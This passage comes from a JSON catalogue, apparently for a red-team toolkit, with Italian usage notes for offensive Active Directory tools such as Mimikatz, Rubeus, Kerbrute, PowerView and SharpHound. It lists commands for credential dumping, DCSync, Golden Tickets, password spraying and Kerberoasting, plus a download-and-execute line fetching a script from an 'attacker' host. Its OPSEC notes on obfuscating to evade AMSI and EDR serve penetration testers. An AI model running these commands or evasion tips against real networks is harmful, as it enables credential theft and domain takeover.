stop\nIEX (New-Object Net.WebClient).DownloadString('http://attacker/Inveigh.ps1')\nInvoke-Inveigh -RunTime 10 -Tool 2 -IP 192.168.1.50</code></pre><p>Utilizzare <code>Stop-Inveigh</code> per terminare i job di ascolto in background e pulire le risorse di rete.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale per <strong>Lateral Movement</strong> su host dove non si vuole lasciare artefatti binari. Se si compromette una workstation con restrizioni sull'esecuzione di EXE ma con PowerShell abilitato, Inveigh.ps1 permette di trasformare l'host in un punto di ascolto per catturare credenziali di altri utenti (es. admin di dominio) che navigano nella stessa subnet.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Molto vulnerabile a <strong>AMSI</strong> (Antimalware Scan Interface) e <strong>Script Block Logging</strong>. La maggior parte degli EDR moderni bloccherà l'esecuzione dello script se non offuscato pesantemente.</p><p><strong>Impatto operativo:</strong> L'esecuzione prolungata in PowerShell può consumare risorse. Stessi rischi di rete della versione EXE.</p><p><strong>Mitigazioni:</strong> Usare offuscatori (es. Invoke-Obfuscation) prima del caricamento. Preferire la versione C# se si dispone di un metodo per eseguire binari, usare PS1 solo come fallback.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "kerbrute-win",
    "name": "kerbrute_Windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/ropnop/kerbrute",
    "desc": "Tool in Go per enumerazione utenti e password spraying veloce e stealth sfruttando la pre-autenticazione Kerberos (porta 88).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Kerbrute sfrutta il protocollo Kerberos per enumerare utenti validi e testare password, offrendo un'alternativa molto più rapida e furtiva rispetto ai metodi tradizionali basati su SMB o LDAP. Poiché interagisce direttamente con il KDC (Key Distribution Center) sulla porta 88, evita di generare i rumorosi log di \"Logon Failure\" (Event ID 4625) tipici dei tentativi NTLM, rendendo l'attività molto più difficile da rilevare per i difensori.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User Enumeration Stealth:</strong> Sfrutta il fatto che il KDC restituisce codici di errore diversi se un utente esiste (<code>KDC_ERR_PREAUTH_REQUIRED</code>) o meno (<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>). Questo permette di validare liste di username enormi in pochi secondi senza inviare alcuna password.</p><p><strong>Password Spraying:</strong> Esegue tentativi di login massivi provando una password contro molti utenti. Se il login ha successo, ottiene un TGT; se fallisce, genera un errore Kerberos. Questo metodo è più veloce del protocollo SMB e non rischia di bloccare l'account se usato correttamente (una sola password).</p><p><strong>Nessun requisito di dominio:</strong> Può essere eseguito da una macchina fuori dominio (es. laptop dell'attaccante in VPN), purché abbia visibilità di rete verso il Domain Controller, rendendolo perfetto per le fasi iniziali di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il binario standalone non richiede installazione. È fondamentale puntare al Domain Controller corretto.</p><pre><code># Enumerazione utenti validi da una wordlist\nkerbrute_windows.exe userenum -d domain.local --dc 192.168.1.10 users_list.txt\n\n# Password Spraying (Check password 'Welcome1')\nkerbrute_windows.exe passwordspray -d domain.local users.txt \"Welcome1\"\n\n# Verifica singola credenziale (Brute force - sconsigliato massivamente)\nkerbrute_windows.exe bruteuser -d domain.local passwords.txt username</code></pre><p>L'output evidenzia in verde le credenziali valide trovate, che possono essere usate immediatamente per accessi VPN, OWA o SMB.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Reconnaissance</strong>, Kerbrute è lo standard per ripulire liste di utenti generate tramite OSINT (es. LinkedIn) e ottenere un elenco di target validi. Nel <strong>Password Spraying</strong>, è preferito per la sua velocità e per la minore impronta nei log di sicurezza standard di Windows, aggirando regole SIEM basate solo su eventi 4625.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene non generi 4625, genera eventi 4771 (Kerberos Pre-Auth Failed). Un volume anomalo di 4771 da un singolo IP è un IoC chiaro per Defender for Identity e SOC avanzati.</p><p><strong>Impatto operativo:</strong> Basso rischio di lockout se usato in modalità spray (1 password). Attenzione alla modalità brute-force che bloccherà account.</p><p><strong>Mitigazioni:</strong> Usare l'opzione <code>--safe</code> (se disponibile nella build) o introdurre delay manuali. Non eseguire da un IP che non si vuole bruciare. Alternare i DC target se presenti multipli.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "mimikatz",
    "name": "Mimikatz",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/gentilkiwi/mimikatz",
    "desc": "Il framework definitivo per credential dumping, manipolazione ticket Kerberos e attacchi avanzati ad Active Directory.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Mimikatz è lo strumento che ha rivoluzionato la sicurezza di Windows, dimostrando le debolezze strutturali nella gestione delle credenziali in memoria. Consente agli attaccanti di estrarre password in chiaro, hash NTLM, ticket Kerberos e certificati direttamente dal processo LSASS (Local Security Authority Subsystem Service). Oltre al dumping, è una piattaforma completa per generare token di accesso falsi (Golden/Silver Tickets) e manipolare il funzionamento della crittografia di dominio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Dumping (Sekurlsa):</strong> Il modulo più noto, capace di leggere la memoria di LSASS per recuperare le credenziali di tutti gli utenti loggati (incluso WDigest, SSP, MSV1_0). Se configurato, può recuperare password in chiaro anche su versioni recenti di Windows.</p><p><strong>Kerberos Manipulation:</strong> Permette di eseguire attacchi Pass-the-Ticket (PTT), Pass-the-Key (PTK) e di creare ticket contraffatti come il Golden Ticket (TGT valido per 10 anni con diritti di Domain Admin) e Silver Ticket (accesso a servizi specifici), garantendo persistenza a lungo termine.</p><p><strong>DCSync:</strong> Simula il comportamento di un Domain Controller per richiedere la replicazione dei dati degli utenti (inclusi gli hash delle password) via protocollo MS-DRSR, permettendo di ottenere credenziali di tutti gli utenti del dominio senza eseguire codice sul DC reale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Mimikatz dispone di una console interattiva. Richiede privilegi di Debug (spesso ottenuti come Admin/SYSTEM).</p><pre><code># Avvio e acquisizione privilegi debug\nmimikatz # privilege::debug\n\n# Dump password e hash da LSASS\nmimikatz # sekurlsa::logonpasswords\n\n# Esecuzione DCSync (da utente con diritti di replica, es. Domain Admin)\nmimikatz # lsadump::dcsync /domain:lab.local /user:Administrator\n\n# Creazione Golden Ticket\nmimikatz # kerberos::golden /user:FakeAdmin /domain:lab.local /sid:S-1-5... /krbtgt:hash... /id:500 /ptt</code></pre><p>Può essere eseguito anche \"oneliners\" passando i comandi come argomenti all'eseguibile: <code>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In fase di <strong>Post-Exploitation</strong> e <strong>Lateral Movement</strong>, è lo strumento primario per trasformare un accesso locale in un compromesso di dominio (tramite credential theft). Per la <strong>Persistence</strong>, i Golden Ticket e Skeleton Key offrono backdoor resilienti. I Blue Team lo utilizzano per verificare l'efficacia delle protezioni come Credential Guard e Protected Users Group.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Mimikatz è la \"firma\" più cercata al mondo. I binari su disco sono bloccati da qualsiasi AV. L'accesso alla memoria di LSASS genera eventi Sysmon (ID 10) e alert EDR critici. DCSync genera eventi di accesso agli oggetti AD (4662).</p><p><strong>Impatto operativo:</strong> Manipolare LSASS può causare Blue Screen of Death (BSOD) se non eseguito con cautela o versioni compatibili. Usare con estrema attenzione su server di produzione.</p><p><strong>Mitigazioni:</strong> Mai usare il binario standard. Eseguire via PowerShell in memoria (Invoke-Mimikatz) con offuscamento pesante, o meglio, usare tecniche di dumping alternative (es. ProcDump, Comsvcs) e analizzare il dump offline con Mimikatz sulla propria macchina.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Credential_Dump"
    ],
    "notes": null
  },
  {
    "id": "pingcastle",
    "name": "PingCastle",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.pingcastle.com/download/",
    "desc": "Scanner di sicurezza per Active Directory che genera report dettagliati su rischi, health check e mappa delle relazioni di trust.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PingCastle è uno strumento di audit progettato per valutare rapidamente il livello di sicurezza di un ambiente Active Directory. Basato su un modello di maturità (CMMI), analizza le configurazioni del dominio e genera un report HTML intuitivo che evidenzia i rischi, assegnando un punteggio di pericolo. È ampiamente utilizzato per identificare vulnerabilità strutturali, relazioni di trust dimenticate e account obsoleti che potrebbero essere sfruttati dagli attaccanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Health Check & Risk Scoring:</strong> Esegue centinaia di controlli di sicurezza (es. LAPS mancante, SMBv1 attivo, amministratori in gruppi a rischio) e calcola un punteggio di rischio aggregato, permettendo di prioritizzare le azioni correttive.</p><p><strong>Mappatura Trust & Forest:</strong> Visualizza graficamente le relazioni di trust tra domini e foreste, evidenziando trust bidirezionali pericolosi verso ambienti meno sicuri o di test.</p><p><strong>Stale Object Analysis:</strong> Identifica utenti e computer inattivi (\"stale\"), che rappresentano una superficie d'attacco inutile e dovrebbero essere disabilitati o rimossi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PingCastle è un eseguibile standalone che può essere lanciato con un account utente standard di dominio (l'accesso in lettura è sufficiente per quasi tutti i check).</p><pre><code># Modalità interattiva (menu guidato)\nPingCastle.exe\n\n# Healthcheck automatico sul dominio corrente\nPingCastle.exe --healthcheck --server domain.local\n\n# Scansione di domini in trust\nPingCastle.exe --scanner trust</code></pre><p>Al termine, genera un report HTML nella cartella di esecuzione, navigabile via browser, con spiegazioni dettagliate per ogni finding e raccomandazioni per la remediation.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilizzato regolarmente dai <strong>System Administrator</strong> per mantenere l'igiene dell'AD e prepararsi agli audit. Per i <strong>Penetration Tester</strong>, è eccellente nelle fasi iniziali per ottenere una visione d'insieme delle debolezze strutturali del cliente (es. \"Quick Wins\") senza generare traffico di attacco, guidando le fasi successive verso i punti più deboli dell'infrastruttura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un volume sostenuto di traffico LDAP e query verso il DC. Sebbene sia traffico legittimo di lettura, l'intensità può essere notata.</p><p><strong>Impatto operativo:</strong> Basso. L'operazione è di sola lettura.</p><p><strong>Mitigazioni:</strong> Proteggere i report generati poiché contengono la mappa completa delle vulnerabilità dell'azienda.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "powerupsql",
    "name": "PowerUpSQL",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/NetSPI/PowerUpSQL",
    "desc": "Toolkit PowerShell per discovery, audit e privilege escalation su istanze SQL Server enterprise.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PowerUpSQL è un framework offensivo dedicato all'attacco delle infrastrutture Microsoft SQL Server. Permette di scoprire istanze SQL sparse nella rete, verificare configurazioni deboli (come password di default o account sa vuoti) ed eseguire escalation dei privilegi. È particolarmente potente nello sfruttare le catene di \"Linked Servers\" per muoversi lateralmente tra database e ottenere esecuzione di codice sul sistema operativo sottostante.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery Massiva:</strong> Trova server SQL tramite query SPN, broadcast UDP e scansioni mirate, mappando rapidamente la superficie d'attacco database dell'azienda.</p><p><strong>Linked Server Crawling:</strong> La feature più temibile: segue automaticamente i link tra database server per trovare percorsi che portano a server critici o dove l'utente ha privilegi elevati (spesso sysadmin), permettendo di saltare da un DB di test a uno di produzione.</p><p><strong>Command Execution:</strong> Automatizza l'abilitazione e l'uso di procedure come <code>xp_cmdshell</code>, <code>Ole Automation Procedures</code> o assembly CLR malevoli per passare dall'accesso SQL all'esecuzione di comandi shell come SYSTEM.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede il caricamento del modulo PowerShell.</p><pre><code># Discovery istanze nel dominio\nGet-SQLInstanceDomain\n\n# Audit rapido delle configurazioni di default\nGet-SQLInstanceDomain | Invoke-SQLAudit\n\n# Crawling automatico dei link per trovare privilegi sysadmin\nGet-SQLInstanceDomain | Get-SQLServerLinkCrawl -Verbose\n\n# Esecuzione comandi OS su istanza vulnerabile\nInvoke-SQLOSCmd -Instance \"SQLSRV01\" -Command \"whoami\" -Verbose</code></pre><p>Il comando <code>Invoke-SQLAudit</code> genera un report CSV con le vulnerabilità identificate per ogni istanza.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>Network Pentest</strong>, i database SQL sono spesso il \"ventre molle\": patchati raramente e configurati con account di servizio privilegiati. PowerUpSQL permette di sfruttare un accesso database limitato per ottenere il controllo completo del server e usarlo come pivot. In <strong>Data Exfiltration</strong>, facilita l'individuazione e l'estrazione di dati sensibili da tabelle critiche.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'abilitazione di <code>xp_cmdshell</code> è un evento ad alta criticità monitorato dai SIEM. Scansioni di discovery e login falliti generano log applicativi SQL.</p><p><strong>Impatto operativo:</strong> L'esecuzione di comandi o query pesanti può degradare le performance del DB. Modificare configurazioni globali può impattare le applicazioni.</p><p><strong>Mitigazioni:</strong> Ripristinare sempre le configurazioni (es. disabilitare xp_cmdshell) dopo l'uso. Limitare il crawling a target specifici.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "powerview-ps1",
    "name": "PowerView.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/PowerShellMafia/PowerSploit",
    "desc": "Script PowerShell di PowerSploit per ricognizione Active Directory pura: enumera utenti, gruppi, trust e sessioni senza dipendenze esterne.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PowerView è uno degli strumenti di enumerazione offensiva più iconici per ambienti Active Directory. Scritto interamente in PowerShell, non utilizza moduli RSAT amministrativi ma interagisce direttamente con le API Win32 e LDAP per mappare il dominio. È progettato per ottenere \"Situational Awareness\" completa: capire chi sono gli admin, dove sono loggati e quali relazioni di trust esistono, il tutto vivendo \"off-the-land\" senza introdurre binari compilati sospetti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>User & Group Hunting:</strong> Funzioni come <code>Invoke-UserHunter</code> e <code>Find-LocalAdminAccess</code> sono vitali per il movimento laterale. Scansionano la rete per individuare su quali macchine sono attive sessioni di utenti privilegiati o dove l'utente corrente ha diritti di amministratore locale.</p><p><strong>Enumerazione ACL & GPO:</strong> Permette di analizzare le Access Control List (<code>Get-DomainObjectAcl</code>) per trovare \"strade nascoste\" di escalation (es. un utente che può resettare la password di un admin) e di leggere le Group Policy per identificare policy di sicurezza deboli o script di avvio modificabili.</p><p><strong>Mappatura Trust:</strong> Con <code>Get-DomainTrust</code> e <code>Get-ForestTrust</code>, visualizza le relazioni logiche tra domini, essenziale per pianificare attacchi che attraversano i confini della foresta AD (es. da un dominio child compromesso al root parent).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede il caricamento del modulo in memoria (spesso bypassando AMSI prima).</p><pre><code># Caricamento e info base dominio\nImport-Module .\\PowerView.ps1\nGet-Domain\n\n# Trovare dove sono loggati i Domain Admin\nInvoke-UserHunter -GroupName \"Domain Admins\" -Stealth\n\n# Enumerare share di rete leggibili in tutto il dominio\nInvoke-ShareFinder -CheckShareAccess -Verbose</code></pre><p>Molte funzioni accettano filtri LDAP raw per query di precisione chirurgica.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong>, è lo strumento primario per rispondere alla domanda \"Dove vado ora?\". Se si compromette un utente, PowerView rivela immediatamente se quell'utente ha accesso speciale (es. RDP su un server critico) o se appartiene a gruppi annidati interessanti. In fase di <strong>Privilege Escalation</strong>, l'analisi delle ACL spesso rivela la via più silenziosa per diventare Domain Admin senza usare exploit.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PowerView è pesantemente firmato dai vendor antivirus. L'esecuzione su disco è quasi sempre bloccata. AMSI intercetta le funzioni caricate in memoria. Le scansioni di rete (es. UserHunter) generano traffico SMB/RPC verso molti host.</p><p><strong>Mitigazioni:</strong> Utilizzare versioni offuscate o eseguire via C2 che supportano l'esecuzione in memoria (come Cobalt Strike <code>powershell-import</code>). Preferire query LDAP mirate (<code>Get-DomainUser</code>) rispetto a scansioni attive (<code>Invoke-UserHunter</code>) se il monitoraggio è alto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "responder-windows",
    "name": "Responder-Windows",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/lgandx/Responder-Windows",
    "desc": "Versione Windows (spesso Python script) di Responder per LLMNR/NBT-NS poisoning e cattura hash NTLM in reti locali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sebbene Responder sia nativo Linux, questa variante permette l'esecuzione su macchine Windows (spesso usando l'interprete Python installato). Esegue lo stesso compito critico: ascoltare richieste broadcast di risoluzione nomi (LLMNR/NBT-NS) e rispondere falsamente per dirottare il traffico verso l'attaccante, catturando hash NTLMv2 degli utenti vittima.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Poisoning:</strong> Risponde a query per nomi host errati, fingendo di essere il server destinazione.</p><p><strong>Auth Capture:</strong> Simula server SMB/HTTP/SQL per forzare i client a inviare le credenziali di autenticazione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python su Windows.</p><pre><code># Avvio standard su interfaccia specifica\npython Responder.py -I \"Ethernet0\" -wrf</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Internal Pentest (Windows-only):</strong> Se si ha accesso a una VM Windows nella rete target ma non si può introdurre una macchina Linux/Kali, questa versione permette di eseguire comunque attacchi MITM per catturare credenziali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Estremamente rumoroso. I moderni Defender rilevano l'ascolto su porte NetBIOS/LLMNR e le risposte rapide.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "rpcdump-windows",
    "name": "rpcdump_windows.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/csandker/RPCDump",
    "desc": "Utility per enumerare endpoint RPC (porta 135), mappare interfacce UUID e identificare servizi nascosti o vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>RPCDump è uno strumento diagnostico essenziale per la fase di ricognizione interna. Interroga il servizio RPC Endpoint Mapper (sulla porta TCP 135) di un host remoto per ottenere l'elenco completo delle interfacce RPC registrate, i loro UUID, i protocolli di binding e le annotazioni. Questa visibilità permette di identificare servizi non standard, versioni di software specifiche e potenziali target vulnerabili (es. vecchie interfacce vulnerabili a MS08-067 o PrintNightmare) che non apparirebbero in una normale scansione di porte.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Endpoint:</strong> Estrae la lista degli endpoint dinamici e statici, rivelando quali porte effimere sono in ascolto per servizi specifici (es. DHCP, DNS management, servizi proprietari).</p><p><strong>Analisi UUID:</strong> Permette di correlare gli UUID universali trovati con servizi noti. Ad esempio, la presenza di UUID specifici può indicare l'installazione di software di backup o di gestione remota vulnerabile.</p><p><strong>Service Discovery:</strong> Identifica servizi che non rispondono alle scansioni SYN standard ma sono raggiungibili tramite Named Pipes o RPC over HTTP.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il tool è una semplice utility a riga di comando che richiede l'IP del target.</p><pre><code># Enumerazione base verso un target remoto\nrpcdump.exe -p 192.168.1.10\n\n# Enumerazione verbose con dettagli sui binding\nrpcdump.exe -v -p 192.168.1.10</code></pre><p>L'output elencherà ogni interfaccia con il formato <code>UUID vMajor.Minor (Annotation) [Binding]</code>. Analizzare le annotazioni per identificare rapidamente software interessanti.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In una fase di <strong>Discovery approfondita</strong>, RPCDump aiuta a mappare la superficie d'attacco reale di un server Windows, rivelando servizi che potrebbero essere firewallati sulle porte standard ma esposti via RPC. È utile anche per confermare la presenza di patch: se un'interfaccia vulnerabile nota non è più listata o ha cambiato versione, è probabile che il sistema sia stato aggiornato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La connessione alla porta 135 e l'interrogazione dell'Endpoint Mapper sono traffico legittimo ma, se eseguite in sequenza su molti host, costituiscono un chiaro pattern di ricognizione.</p><p><strong>Impatto operativo:</strong> Nullo, è una query informativa standard.</p><p><strong>Mitigazioni:</strong> Eseguire scansioni mirate piuttosto che sweeping sull'intera subnet.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "rubeus-exe",
    "name": "Rubeus.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/GhostPack/Rubeus",
    "desc": "Il coltellino svizzero C# per Kerberos abuse: TGT requests, roasting, ticket extraction, pass-the-ticket e monitoraggio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Rubeus è lo standard de facto per la manipolazione di Kerberos in ambienti Windows. Scritto in C# per integrarsi con framework .NET e Cobalt Strike, permette di eseguire quasi ogni attacco noto contro Kerberos: dalla richiesta di ticket (AS-REQ) all'iniezione in memoria (Pass-the-Ticket), fino al roasting (Kerberoast/ASREPRoast) e all'intercettazione di ticket al volo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Roasting & Harvesting:</strong> Esegue Kerberoasting e AS-REP Roasting in modo stealth, estraendo hash crackabili.</p><p><strong>Ticket Management:</strong> Può estrarre ticket (TGT/TGS) da sessioni di altri utenti (dump), iniettarli nella sessione corrente (ptt) o rinnovarli.</p><p><strong>Advanced Attacks:</strong> Supporta S4U (Constrained Delegation abuse), Diamond Ticket, Sapphire Ticket e manipolazione di ticket per Golden/Silver ticket attacks.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire da riga di comando o via execute-assembly.</p><pre><code># Kerberoasting stealth con output su file\nRubeus.exe kerberoast /outfile:hashes.txt\n\n# Pass-the-Ticket (iniezione file kirbi)\nRubeus.exe ptt /ticket:administrator.kirbi\n\n# Monitoraggio nuovi ticket (harvesting)\nRubeus.exe monitor /interval:10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Lateral Movement & Persistence:</strong> Tool onnipresente in ogni fase. Dopo l'accesso iniziale, si usa per l'escalation (Roasting). Dopo aver ottenuto admin, si usa per persistenza (Golden Ticket) o movimento laterale (Overpass-the-hash).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Rubeus è pesantemente firmato. L'uso in memoria è soggetto a scan AMSI e comportamentale. Tecniche come <code>monitor</code> o iniezioni ticket massicce sono rumorose.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "securityassessment-ps1",
    "name": "SecurityAssessment.ps1",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Script PowerShell per audit automatico della postura di sicurezza Windows/AD, verifica hardening e compliance a best practices.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SecurityAssessment.ps1 è uno script di audit progettato per valutare rapidamente il livello di hardening di workstation e server Windows. A differenza dei tool offensivi, il suo scopo è difensivo o di \"situational awareness\": analizza centinaia di impostazioni di configurazione (GPO, Registry, Audit Policy, Patch level) e le confronta con le best practice di sicurezza (es. CIS Benchmarks, Microsoft Security Baselines), generando un report dettagliato sulle lacune identificate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Configurazione Sistema:</strong> Verifica lo stato di UAC, AppLocker, BitLocker, Credential Guard e servizi vulnerabili attivi. Controlla le impostazioni di SMB (v1 disabilitato, signing richiesto) e protocolli di rete obsoleti (LLMNR/NBT-NS).</p><p><strong>Audit Policy & Logging:</strong> Analizza se il sistema sta registrando gli eventi critici necessari per la rilevazione di attacchi (es. Command Line Auditing, PowerShell Script Block Logging, Logon Events).</p><p><strong>Account & Privilegi:</strong> Identifica account locali inattivi, membri del gruppo Administrators locale e configurazioni dei diritti utente (User Rights Assignment) che deviano dai valori sicuri.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire lo script da una shell amministrativa. Non richiede installazione.</p><pre><code># Esecuzione standard con generazione report\nPS C:\\> .\\SecurityAssessment.ps1\n\n# Esecuzione con output in cartella specifica\nPS C:\\> .\\SecurityAssessment.ps1 -OutputPath C:\\Audit\\Reports</code></pre><p>Al termine, esaminare il file HTML o CSV generato per prioritizzare le remediation in base alla gravità dei riscontri (Rosso/Giallo/Verde).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Usato dai <strong>Blue Team</strong> per verificare la conformità delle \"Golden Image\" prima del deployment. Per i <strong>Penetration Tester</strong>, se si ha accesso fisico o RDP a una macchina, fornisce una lista immediata di vettori di Privilege Escalation locale (es. servizi con path non quotati, AlwaysInstallElevated) e difese mancanti (es. no AV, no EDR).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Lo script esegue letture massive del registro e WMI. Su sistemi con EDR avanzati, questo comportamento (simile a tool di enumeration offensivi come Seatbelt) potrebbe generare alert.</p><p><strong>Impatto operativo:</strong> Basso, attività di sola lettura.</p><p><strong>Mitigazioni:</strong> Se in contesto Red Team, leggere il codice e lanciare solo funzioni specifiche manualmente invece dell'intero script.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "sharphound-exe",
    "name": "SharpHound.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SpecterOps/SharpHound",
    "desc": "Collector C# per BloodHound: mappa relazioni AD, ACL, sessioni utente e trust per identificare attack path complessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpHound è il componente di raccolta dati (Ingestor) per BloodHound. Scritto in C#, è progettato per interrogare massivamente l'Active Directory ed estrarre le relazioni logiche tra utenti, gruppi, computer e container. I dati raccolti (formattati in JSON) vengono poi importati nel database Neo4j di BloodHound per visualizzare graficamente i percorsi di attacco che permettono di scalare privilegi o muoversi lateralmente nel dominio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione Strutturale:</strong> Scarica l'intera struttura del dominio (OU, gruppi, utenti), le relazioni di trust tra domini/foreste e le Group Policy. Utilizza LDAP per query efficienti e minimizzando il traffico.</p><p><strong>Analisi ACL & Sessioni:</strong> La vera potenza risiede nell'enumerare le Access Control List (chi può resettare la password di chi?) e le sessioni attive (dove è loggato l'Admin?). Per le sessioni, interroga i singoli host via RPC/NetBIOS (\"Session Loop\").</p><p><strong>Stealth & Optimization:</strong> Include opzioni per randomizzare i delay, escludere Domain Controller, criptare gli output e usare metodi di raccolta meno invasivi (es. solo DCOnly) per ridurre la visibilità.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire da una macchina joinata al dominio con un utente qualsiasi. L'opzione <code>-c All</code> è la più comune ma rumorosa.</p><pre><code># Raccolta completa standard\nSharpHound.exe -c All\n\n# Raccolta stealth (solo dati AD, niente connessioni agli host)\nSharpHound.exe -c DCOnly --randomizefilenames --encryptzip\n\n# Loop continuo per mappare sessioni (ogni 30 min per 2 ore)\nSharpHound.exe -c SessionLoop --loopduration 02:00:00 --loopinterval 00:30:00</code></pre><p>Caricare il file <code>.zip</code> generato nell'interfaccia grafica di BloodHound.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>È lo standard industriale per mappare il rischio di <strong>Lateral Movement</strong>. Fondamentale per rispondere a domande come: \"Da questa workstation compromessa, posso arrivare al Domain Admin?\". Utile anche ai difensori per identificare e rimuovere \"Dangerous Rights\" assegnati per errore a gruppi generici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'enumerazione delle sessioni (metodo <code>All</code> o <code>Session</code>) tocca ogni host della rete, generando un \"port scan\" distribuito sulla porta 445 molto rumoroso. Defender for Identity rileva l'enum LDAP massiva.</p><p><strong>Mitigazioni:</strong> Usare <code>-c DCOnly</code> per restare quasi invisibili (solo traffico LDAP verso il DC). Evitare 